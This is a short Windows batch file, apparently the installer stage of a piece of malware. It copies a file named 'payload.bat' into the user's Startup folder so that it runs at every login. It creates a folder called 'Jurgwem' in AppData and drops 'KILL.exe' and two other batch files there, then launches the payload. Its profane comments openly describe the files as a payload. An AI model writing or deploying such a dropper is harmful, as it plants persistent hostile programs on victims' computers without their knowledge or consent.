@echo off
title startup script
copy "payload.bat" C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\
if not exist "C:\Users\%USERNAME%\AppData\Roaming\Jurgwem" mkdir C:\Users\%USERNAME%\AppData\Roaming\Jurgwem
copy "KILL.exe" C:\Users\%USERNAME%\AppData\Roaming\Jurgwem\
copy "cleaner.bat" C:\Users\%USERNAME%\AppData\Roaming\Jurgwem\
copy "debug.bat" C:\Users\%USERNAME%\AppData\Roaming\Jurgwem\
::above: move to startup + create /Jurgwem/ and move shit there
::below: start programs, aka 'payload' which is not even the fucking payload lmak
start C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup\payload.bat
exit